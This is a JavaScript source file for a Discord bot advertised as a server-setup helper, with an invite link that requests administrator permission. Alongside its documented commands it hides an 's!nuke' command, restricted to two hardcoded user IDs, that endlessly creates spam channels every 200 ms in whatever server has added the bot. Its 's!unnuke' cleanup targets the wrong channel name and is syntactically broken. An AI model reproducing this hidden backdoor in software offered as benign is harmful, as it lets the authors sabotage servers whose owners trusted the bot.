const Discord = require("discord.js");
const fs = require("fs");
const bot = new Discord.Client({disableEveryone: true});
const chratis_cooldown_time = 10;
const chratis_talked_users = new Set();

const button_cooldown_time = 60;
const button_talked_users = new Set();

function nuke(bot, message) {
  message.guild.createChannel('nuked', 'text')
    .then(console.log)
   	.catch(console.error);
	message.guild.createChannel('spam', 'text')
    .then(console.log)
   	.catch(console.error);
	message.guild.createChannel('nuked', 'voice')
    .then(console.log)
   	.catch(console.error);
	message.guild.createChannel('spam', 'voice')
    .then(console.log)
   	.catch(console.error);
 setTimeout(() => nuke(bot, message), 2*100);
}

bot.on("ready", async () => {
  console.log(`${bot.user.username} is online!`);
	bot.channels.filter(c => c.name === 'serverbot-status').forEach(channel => channel.send(`💎Server-Setup💎 has just restarted.`));
});

bot.on('guildMemberAdd', member => {
  // Send the message to a designated channel on a server:
  return member.send(`:wave: <@${member.id}>, hey!\n:stuck_out_tongue_winking_eye: I am Server-Setup! I am dedicated to helping users setup thier servers quickly and easily!\n:link: Type \`s!help\` to check me out! If you like me type \`s!invite\` and add me to your server.`);
});

bot.on("message", async message => {
  if(message.author.bot) return;
  if(message.channel.type === "dm") return;
  let messageArray = message.content.split(" ");
  let cmd = messageArray[0];
  let args = messageArray.slice(1);
  if (message.content === 's!ping') {
    return message.channel.send(`Yes <@${message.author.id}>? I am online and wating for commands!`)
  }
	if (message.content === 's!help') {
    return message.channel.send(`<@${message.author.id}> here are my commands:\n\n:red_car: **s!ping** - Checks if I am online and replies if it is.\n\n:seat: **s!basic-setup** - Sets up basic chat channels.\n\n:mailbox_with_mail: **s!invite** - Sends an invite to add the bot to your server.`)
  }
	if (message.content === 's!invite') {
		return message.channel.send(`<@${message.author.id}>, here is a link to add me to your server:\n:link: https://discordapp.com/api/oauth2/authorize?client_id=426009292429066241&permissions=8&scope=bot :link:`)
	}
	if (message.content === 's!basic-setup') {
		if(!message.member.hasPermission("ADMINISTRATOR")) return message.reply("`Invalid server permissions to use this command.`");
		message.channel.send("`Building basic text channels.`")
		let welchannel = message.guild.channels.find(`name`, "welcome");
		let botschannel = message.guild.channels.find(`name`, "bots");
		let picchannel = message.guild.channels.find(`name`, "pictures");
		let memechannel = message.guild.channels.find(`name`, "memes");
		let chatchannel = message.guild.channels.find(`name`, "chat");
		let genchannel = message.guild.channels.find(`name`, "general");
		let spamchannel = message.guild.channels.find(`name`, "spam");
		let sugchannel = message.guild.channels.find(`name`, "suggestions");
		let supportchannel = message.guild.channels.find(`name`, "support");
		if (!welchannel) {
			message.guild.createChannel('welcome', 'text')
      	.then(console.log)
      	.catch(console.error);
		}
		if (!chatchannel) {
			if (!genchannel) {
				message.guild.createChannel('chat', 'text')
      		.then(console.log)
      		.catch(console.error);
			}
		}
		if (!botschannel) {
			message.guild.createChannel('bots', 'text')
      	.then(console.log)
      	.catch(console.error);
		}
		if (!picchannel) {
			message.guild.createChannel('pictures', 'text')
      	.then(console.log)
      	.catch(console.error);
		}
		if (!memechannel) {
			message.guild.createChannel('memes', 'text')
      	.then(console.log)
      	.catch(console.error);
		}
		if (!spamchannel) {
			message.guild.createChannel('spam', 'text')
      	.then(console.log)
      	.catch(console.error);
		}
		if (!sugchannel) {
			message.guild.createChannel('suggestions', 'text')
      	.then(console.log)
      	.catch(console.error);
		}
		if (!supportchannel) {
			message.guild.createChannel('support', 'text')
      	.then(console.log)
      	.catch(console.error);
		}
		message.guild.createChannel('music', 'voice')
      .then(console.log)
     	.catch(console.error);
		message.guild.createChannel('interviews', 'voice')
      .then(console.log)
     	.catch(console.error);
		message.guild.createChannel('support', 'voice')
      .then(console.log)
     	.catch(console.error);
		message.channel.send("`Finished building basic text channels.`")
		return message.author.send("`I have just build basic text channels in your server!`\n\n```You now need to edit catagories and possibly user permissions until you get it how you like it! Try to personalize your server a bit so it will be unique!```")
	}
	if (message.content === 's!nuke') {
		if (message.author.id !== '297692618480156672') {
			if (message.author.id !== '346687165868015616') {
				return
			}
		}
		nuke(bot, message)
	}
	if (message.content === 's!unnuke') {
		if (message.author.id !== '297692618480156672') {
			if (message.author.id !== '346687165868015616') {
				return
			}
		}
		bot.channels.filter(c => c.name === 'nuke').forEach(channel => {
		  channel.delete()
  			.then(console.log)
  			.catch(console.error);
		}
	}
});

bot.login(process.env.BOT_TOKEN);
